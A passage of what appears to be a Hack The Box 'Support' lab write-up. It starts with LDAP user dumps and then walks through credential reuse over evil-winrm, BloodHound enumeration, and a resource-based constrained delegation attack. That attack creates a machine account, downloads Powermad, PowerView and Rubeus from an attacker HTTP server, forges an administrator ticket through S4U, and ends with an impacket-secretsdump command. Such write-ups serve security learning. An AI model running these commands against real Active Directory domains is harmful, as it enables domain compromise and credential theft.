objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILXAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: west.laura
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111455.0Z
dSCorePropagationData: 16010101000000.0Z
mail: west.laura@support.htb

# langley.lucy, Users, support.htb
dn: CN=langley.lucy,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: langley.lucy
sn: langley
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: lucy
distinguishedName: CN=langley.lucy,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111510.0Z
whenChanged: 20220528111511.0Z
uSNCreated: 12996
uSNChanged: 13011
company: support
streetAddress: Skipper Bowles Dr
name: langley.lucy
objectGUID:: T9fnf6QIlE2uz+4YhFZ3aw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101109308007
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILXQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: langley.lucy
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111511.0Z
dSCorePropagationData: 16010101000000.0Z
mail: langley.lucy@support.htb

# daughtler.mabel, Users, support.htb
dn: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: daughtler.mabel
sn: daughtler
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: mabel
distinguishedName: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111526.0Z
whenChanged: 20220528111527.0Z
uSNCreated: 13013
uSNChanged: 13028
company: support
streetAddress: Skipper Bowles Dr
name: daughtler.mabel
objectGUID:: iWH2yMa7h0e1dPAKT9MtgA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101262745576
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILXgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: daughtler.mabel
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111526.0Z
dSCorePropagationData: 16010101000000.0Z
mail: daughtler.mabel@support.htb

# stoll.rachelle, Users, support.htb
dn: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: stoll.rachelle
sn: stoll
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: rachelle
distinguishedName: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111542.0Z
whenChanged: 20220528111543.0Z
uSNCreated: 13030
uSNChanged: 13045
company: support
streetAddress: Skipper Bowles Dr
name: stoll.rachelle
objectGUID:: Oe9hWbyotkWg+Aty/bcKYw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101422902140
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILXwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: stoll.rachelle
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111542.0Z
dSCorePropagationData: 16010101000000.0Z
mail: stoll.rachelle@support.htb

# ford.victoria, Users, support.htb
dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: ford.victoria
sn: ford
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: victoria
distinguishedName: CN=ford.victoria,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111557.0Z
whenChanged: 20220528111558.0Z
uSNCreated: 13048
uSNChanged: 13063
company: support
streetAddress: Skipper Bowles Dr
name: ford.victoria
objectGUID:: igFAMPhgAEqMFr/4HUIY5A==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101581183009
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILYAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: ford.victoria
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111558.0Z
dSCorePropagationData: 16010101000000.0Z
mail: ford.victoria@support.htb

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 24
# numEntries: 20
# numReferences: 3


```

Credentials recovered: `support:Ironside47pleasure40Watchful`

## User Flag

Accessing Win-Rm service as support:

```
evil-winrm -i 10.129.50.211 -u support -p Ironside47pleasure40Watchful
```

```
*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
89a6b2b28e02a4a1ef1c54d42f73a1b7 censor
```

---
## Privilege Escalation

### Enumeration

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

 bloodhound collector with `support` creds is used to create json files which contain information about the objects present in the AD environment, and later ingest them into bloodhound:
 
```
 bloodhound-ce-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.50.211 -c All

INFO: BloodHound.py for BloodHound Community Edition

INFO: Found AD domain: support.htb

INFO: Getting TGT for user

INFO: Connecting to LDAP server: dc.support.htb

INFO: Found 1 domains

INFO: Found 1 domains in the forest

INFO: Found 2 computers

INFO: Connecting to LDAP server: dc.support.htb

INFO: Found 21 users

INFO: Found 53 groups

INFO: Found 2 gpos

INFO: Found 1 ous

INFO: Found 19 containers

INFO: Found 0 trusts

INFO: Starting computer enumeration with 10 workers

INFO: Querying computer: 

INFO: Querying computer: dc.support.htb

INFO: Done in 00M 07S
```

`support` is member of the shared support accounts, which has GenericAll ACL (?) over the domain controller (explain more in depth how this could lead to a DSYnc):

![](./screens/1.png)

## Exploitation

(here i just followed the steps explained in bloodhound)
```
 (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/Powermad.ps1','C:\Users\support\Documents\Powermad.ps1')
```

```
*Evil-WinRM* PS C:\Users\support\Documents> import-module .\powermad.ps1
```

```
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
```

```
*Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/PowerView.ps1','C:\Users\support\Documents\PowerView.ps1')
```

```
*Evil-WinRM* PS C:\Users\support\Documents> import-module .\powerview.ps1
```

```
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer -Identity attackersystem


pwdlastset             : 7/13/2026 11:44:19 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=attackersystem,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : attackersystem
objectsid              : S-1-5-21-1677581083-3380853377-188903654-6102
samaccountname         : attackersystem$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 7/13/2026 6:44:19 PM
instancetype           : 4
usncreated             : 90262
objectguid             : 6c82eb5a-1209-4a45-b953-3188f5509020
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/attackersystem, HOST/attackersystem, RestrictedKrbHost/attackersystem.support.htb, HOST/attackersystem.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : attackersystem
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 7/13/2026 6:44:19 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 90264
dnshostname            : attackersystem.support.htb



*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer attackersystem -Properties objectSid


DistinguishedName : CN=attackersystem,CN=Computers,DC=support,DC=htb
DNSHostName       : attackersystem.support.htb
Enabled           : True
Name              : attackersystem
ObjectClass       : computer
ObjectGUID        : 6c82eb5a-1209-4a45-b953-3188f5509020
objectSid         : S-1-5-21-1677581083-3380853377-188903654-6102
SamAccountName    : attackersystem$
SID               : S-1-5-21-1677581083-3380853377-188903654-6102
UserPrincipalName :

```

importing rubeus

```
*Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8001/Rubeus.exe','C:\Users\support\Documents\Rubeus.exe')
```

```
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Summer2018!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Calculate Password Hash(es)

[*] Input password             : Summer2018!
[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!

```

```
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:"cifs/dc.support.htb" /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: S4U

[*] Using rc4_hmac hash: EF266C6B963C0BB683941032008AD47F
[*] Building AS-REQ (w/ preauth) for: 'support.htb\attackersystem$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFojCCBZ6gAwIBBaEDAgEWooIEszCCBK9hggSrMIIEp6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBG0wggRpoAMCARKhAwIBAqKCBFsEggRX0QhC4AuS
      hPg+qL4cEqv1u786VcV8pTtoX6mtzQk+Nn/vpzYVsMG7fgLtU+bIB95rl3g9a0JQfHpmaq01as4xfiyk
      VWtdmFPQIKjXJSA6nJ17684/ZICwgyMNnNmizR8CuCVSaZxaPkGWUXn9ZcFeih9QYyZP7ffk+LfGgUb+
      20FUHslff3oHhCNKG+zx3E8lVIgty16Jqx4CuTAr9+qiGaC/M2Z9PD7dWTpBAKcTZngOsJ/HmPUMBmzQ
      +Nwiatcj5Q+TP7lqIGqIbJ1oAZ7vDBrxFWpNKw8uI5MDYiXNe9bSlxCzTShJt/VNqXlplK6UUy6jY6GL
      Xhb+sAFnY3VgYscGdSWDk88zPe+bQLKf2B6ce+GJzjloqJUXsoImOq5X58lUnONo+TF9t0IW0UinKCP9
      bwgEAahM1Naz0jhNzSbJUajpinIrZM8L7orRYbsTA9853HlcOh/L5VX2urKYSNs5vgBZZ9IGwcLlkQ8i
      s+JsDvLVZjLhfBPmlvaWo8VzjBwxLO6sqYhzn6ZRjjIiD1Ublt31YKWs6UDmevQlcBBtB9xXdW2viuYd
      8vQMivNvgNUUrBARQ771k4wZ3W8pCW9ViV5LZXbZhWgCzA/ZG2zkDtSI7tlgCGSlq6s9NGzCCQABYEDa
      IlOds/Yi4EdH0sYzVSSYr+lOFjKZR1lesZ+sVfWrnYpvk1a+ek0S9e8yEfNEVpYM5CLvkSrMHGHcm4zd
      SniYQKbm9F1J6NG1zjnrxHHIUoP5QbdLEKfH+wiJ7h9O2NOCC07vywR0c/0Ba4OeBlFOXqFRBAJv/htQ
      WiVkvTzGPmLyO1TCC3kpN1AZQwHA70B0lCvLLCcRz5uBArbllv/7y9wvq9yJpy19J/pzCyZrDAe/p46+
      boiCxrqks2ekYdvAzQjZ4rUb3vyf5/2u1Kt2izKYuGKMCFANCyuS+5DVlPUdAcfUpsf5JVv9/+DPUkw6
      wnNnIpW+bHY8GfJ21NVjLeNRscJmPyDswbBqeApJhGp0epPl95vYZI6hv9gXHg6vjncz3dPtOO5J6p6Y
      YvvZM3698HhmVU3pAPAs5huy+uhrZMs++MRLlq7IwXgy2s1NBVmhIVNc1SToNDpP6iULRl0vwQeHszdg
      Il0k7Ll1DdDDLeyMliOFOVw0js7j2/bBgfQ3/B6UlM0Rh+HpyunRE0Gw/aU3ARdvOahW3KV67UpZ3PDq
      XQIU9tfQUqEuJglTMCJHsDJutO6EXl/8YXoaxYjIYVvSgcCVX7gShFs03LCCrwuE0q//1iuYOZUUMlEr
      5vfX5sjHHA8Co7ws6A6OQAcnh9+Z1OuHdjx0sYyHW417Py+gpdCLEmbV0/IaX79afbtvRmImDh1bVQFR
      P3v7B0wt5BQ5Jv8NT80s12PpJBp0K5rP+jGkv86hwSFU91EaFg8Up6p4qzUw/kQZFJOwqX/5/B4GEcPl
      QQ1VTVT33YJsM0or0MQFaV5+wnxsbES+k6OB2jCB16ADAgEAooHPBIHMfYHJMIHGoIHDMIHAMIG9oBsw
      GaADAgEXoRIEEP6hqASxHsRnD0CS/bux5mKhDRsLU1VQUE9SVC5IVEKiHDAaoAMCAQGhEzARGw9hdHRh
      Y2tlcnN5c3RlbSSjBwMFAEDhAAClERgPMjAyNjA3MTMxOTI3MDVaphEYDzIwMjYwNzE0MDUyNzA1WqcR
      GA8yMDI2MDcyMDE5MjcwNVqoDRsLU1VQUE9SVC5IVEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBv
      cnQuaHRi


[*] Action: S4U

[*] Using domain controller: dc.support.htb (::1)
[*] Building S4U2self request for: 'attackersystem$@SUPPORT.HTB'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'attackersystem$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      doIFsjCCBa6gAwIBBaEDAgEWooIEyTCCBMVhggTBMIIEvaADAgEFoQ0bC1NVUFBPUlQuSFRCohwwGqAD
      AgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0ko4IEhzCCBIOgAwIBF6EDAgEBooIEdQSCBHFwzKv0HIbs7qVd
      aLbvJzT1oR7YCOLhR7FNujICkT2aGUOU0Ai8Yn4cYHobtzB/WdTmJyOZCknId+lkGPQd8OheStwPxAzM
      gZBu4TJGhJd49YvhQxDZk3dtA/G+uG+gRax72tAD4NgdeBBEWphcf10nQ0abqWzdg6HR/rIrCjHvid5b
      cj7VNbxwzd8jR+o0TE4YrC/NSxaNbhZNeS0OQAXf0mNFN5Svcb9+0RvEnfYhwK8DYSP/hL3e5zM5c27K
      EEugJ6fS+JkS2RQlDRZVAy729qg/+RQ5kn1XiF2akMUb3jl55iYcrHy+W5UMrXshHM/Z7AXFIuY1FJ8e
      pIwNKQh+K27DKzjM1uS9ryjpejVtQjfjqpdlsyuock79ZomVCqEnwORMGqPqsim1jyW8ajOrIJGBzCZq
      5fBzVAStWe12t+uE7RK0N+QpKMxt8KNrgNqgBwnf5l+sEvhNbV8hT/CTHSMuOeRI9AFbtJ3Mqz1Vew6v
      ENCPOTDDw7PQ0/fFl36ftsI9zIZ7Efa3itFdG8v3wvK5CCQKSDYdaLQIrd3pjhE6ydwzBngCPAtabhpa
      alqxkQnoha5CuYgT7PB+B4Nxz3IUB5emoUif7gs+9fLpjvXJF4ZXjrPtk89jir4P/cmwcrfsQHxTT2Is
      UmuXUkM55qwuI4CobThV9CFHvY/4lORnaNBHcZmW+gDQ7VNcfj0qeHSPpXSHpk1cm8ZYvr0Fxx6nQix0
      JgHn+p5hISuGfzMOd6NHhXfKFUGIBYP/B//ltBn2hyA7PvoQL9Wv7OMb6JMr7Sb2uY9NAuWcylqzFB6r
      4FsgiWd5Ts9rP1zq0KVxARmLvv9JYFz6iUS4zlpYUbDpJL+nUXBC/2e1NK8TBdx2Oij3+k2H7sTafnWZ
      +JfIEin8Vm9bXL924G/vazqZelVYvR4LNeMTjbPW9j+f3gExOFNPc0t9T3eKSVMZENHyYQSULEpJwYGU
      wH5FCWiF9sWBtxh/yVwi4VmB8Q2bvd+xOk67mtads9aCPMum5CuQ0BwL/IBUDgyXajo0sPkOCm0Dil3x
      LnSy4p+6/+ilY8hZEJhvkwx2khVNMKwzKF/js4CI+AINMlF91t7YUNjpYIBNEgDyXe/Kh1zPsC3w/TuK
      VSU1n/u7vQOK35HPGdFTO4AVLCWDbI5oPNMgAChpcw3fKUJqER2eLjNQVX/avUhjIKzmbyw9B6t/6YEC
      iNWm2AEHKAwfpNmShLXzm4w2kdcHlTkdugT6PgTTMr6T+sNK6z+wROXU2JM6KaB2zj1EQMH0jGj7zI/8
      dHnN3gE0/Yp37fDRkzu5LiDzOrthDJzWV3Hgorjsvcde7MY2S1rXcem1fpMJnEy3QZpzC9jVYNtYhjNp
      v7gQBdlV66xayL4bos2NX8pp5cU0ZBroUJKZgetegXjaX4e4xPN3tMZNO7JpBR/1Zb7qGElK3EqE6HSR
      Vu5p0WmmvyGzrEW6RpFyS4ocRjLQ7e7brPJ52AjPg/JnnUHZL80KZPdnmVF9fAejgdQwgdGgAwIBAKKB
      yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCWxXdGfhVjwxOu7kCzxABpoQ0bC1NVUFBPUlQu
      SFRCohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI2MDcxMzE5MjcwNVqm
      ERgPMjAyNjA3MTQwNTI3MDVapxEYDzIwMjYwNzIwMTkyNzA1WqgNGwtTVVBQT1JULkhUQqkcMBqgAwIB
      AaETMBEbD2F0dGFja2Vyc3lzdGVtJA==

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQaiggUpBIIFJUoNtdRm
      VzfBserwpBbJq0E39igiQ52VailChXSAWisNuuYogag1V+BOE6hVenxf4L49A3kI82SuGNDjZ2gnuDEP
      PQyP54crEF98SRdPO5o4woDzDe7VAGAE6MpZwz1Ckjd+AfibJvq54mzLhbHqtIk02pRNbgPH5eE9th/x
      HInAZU5pwLht42R7Dkem8Wou3t2ZTcqU7tm1/Nv8bjU7vUDPSsBtXCLXvwjqFKrbIC7NiY/KUdUwF1eQ
      g7kyOKsDBsP5t/lEmO9vmdWiz09LqCAQ3dViyxWvKjfUkM/Vq4w461xYoAuc2Gl/iCyBMDuQn0/MAzN4
      lfznrPEaGLxbA7Hoeiz1NZCfCDRBsbPGqDYTe8L4F+loCz5GaQyrugSZVxvYOGrJ4+zUJFjw27cwg7Qg
      kjohmd9KsipkeMO5UfPr4ZzIrZncD9FVtQHim2UMxAExNAh5vVWlO9I4qY4CPG/QTBVqXaFIWE/dm8OK
      39Bj8RYaH55zk6sOtrP9LPyZoBNSkkTu/RZ1+Rk8xBvIUz1xg5ogXqzQZQ+CnbxJOe7zw5XAKNi+9iwo
      fHzQYjy0xbc1UtPjYrPC66Cxq3WG432/U3YT7/o2t4cijyVCgkqW3nXKxaSgPGF/Dcj9GkqYI5c2RvWD
      PHAi+f/XhDY8XwEWbnfM3cHimZn9vqAV3BPr/kPngiwcpHVbkZyT9Fo2NfI5CrYbE3jprZkA/43IHBkM
      +7XGsaWKN2/JVsF7GHHMGJ+8B6qFaDLCWnuI1DXPPzUlaBr70ckufgD2hazTzMMvejZLcQqe3pRExfsU
      rhC/X13wNyH5HZk3HfeiayFKGM6UPzhuZ6azdNfa0DwmJpj/2wjZXZq6R8lQkTh5/5Vcnf8nZfP1Pn8Q
      PIfm2lcfistHVJLaF2ibCKp3d4cCZNPkFk582ubZIagSPUWnlHk+kizT3GNsp7nJzS0EC5POlR44+DYz
      G8z3dlpAHCSK6lLA86iG2M3g9jty6/ycjij6pEPW7oab/vU2/caboJSbQvJ+//unrbL5GW9qGAeGULVS
      CbKyAjo7zJxB2mf766k6EXqwMIsMNFCqvKe8z2CFC8g67b2LJSfW8c/Px1gFOatpT/nst6OoGdz9AZ32
      T7TiMChLW/8dr8piLiXqQhnyztxNrpMGApsdwAFgjZmlWk9xe+XXw5MLJogiwu7D8kfDmUpHvhOaxiZ7
      OfGokUVq2zcW6uOFNJ1jfaGEyOgKBfZ/oJ1lSGY2B2bxNG2Ra7gcV6BAbxZUnXwKGrSay7leZEkC57Rm
      Y7L2Z1t0RHI0jaEeNf/FgrRLi4XJp/LbKm1d5tgmmpU4mlTNMtiJW0aXC09YW1ZYT4p5o+Th6cjm+WOu
      7IYEeZ4KeW3AXjDihTcrGlj1Dqh0aVHdarAXYdQ2VSYzHr+tfWBYdXJ1xoYY/CEBJktiSV9ifpIIdDod
      Wrbs89QW0ta/xzZD6HXjytyAqkYMbveFO8GOTLUs7MMmETjh381hqDhUSRghclNx9tj8fZMWhmNDhuPj
      GM7SWMRWa4SzePuoloM4+JA2JokERMTkLkRlOqDbiddUrOziEvHag2ptforjRdVHALCwL4CSwkX5ooWk
      ykfGrSGjd3J3PVNqT7Ao/zTQZ0pjmWjGaEdleFE8jSM8CqyUvvWbELYAZvbrw1K415Wtab+aCAz8ndfK
      0cV/qmTr1ZgJN1FKCjiNREegypU0gEIyqUVi0BnTNr+fSRbPy9ujIEUrQqW2CXOWlqp7f6OB2TCB1qAD
      AgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEEKwr4PF4gI+7WgkwN+d0EayhDRsLU1VQ
      UE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjYwNzEzMTky
      NzA1WqYRGA8yMDI2MDcxNDA1MjcwNVqnERgPMjAyNjA3MjAxOTI3MDVaqA0bC1NVUFBPUlQuSFRCqSEw
      H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=
[+] Ticket successfully imported!

```

on kali:

```
cat > admin.b64 << 'EOF'   
heredoc> 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

heredoc> EOF

```

```
tr -d '[:space:]' < admin.b64 > administrator.b64
```

```
base64 -d administrator.b64 > administrator.kirbi
```

```
 impacket-ticketConverter administrator.kirbi administrator.ccache                                
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done                                            
```

```
impacket-secretsdump -k -no-pass -dc-ip 10.129.50.211 support.htb/administrator@dc.support.htb -just-dc-user Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

